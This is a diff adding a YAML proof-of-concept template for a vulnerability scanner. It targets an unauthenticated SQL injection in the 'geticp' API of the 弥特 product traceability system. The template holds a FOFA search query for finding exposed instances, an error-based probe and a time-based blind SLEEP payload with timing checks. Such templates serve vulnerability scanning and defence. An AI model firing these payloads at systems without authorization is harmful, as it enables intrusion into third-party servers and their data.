@@ -1,0 +1,20 @@
+id: poc-yaml-mtscitech-fpts-geticp-sqli
+info:
+  name: 弥特全流程追溯系统 geticp SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 弥特全流程追溯系统
+  fofa: (body="chunk-libs.45edf705.css" && title="产品追溯系统") || title="4.1.0追溯系统"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /api/org/enterpriseaccountnoauth/geticp?enterprise_code='
+  expression: status_code == 200 && contains(body,"SQL syntax") && contains(body,"操作出错")
+- method: GET
+  path: /api/org/enterpriseaccountnoauth/geticp?enterprise_code=');SELECT+SLEEP({{.t1}})--+
+  expression: status_code == 200 && contains(body,"\"message\":\"成功\"") && !contains(body,"<")
+    && contains(content_type,"application/json") && duration > t1 && duration < t2
+transport: http
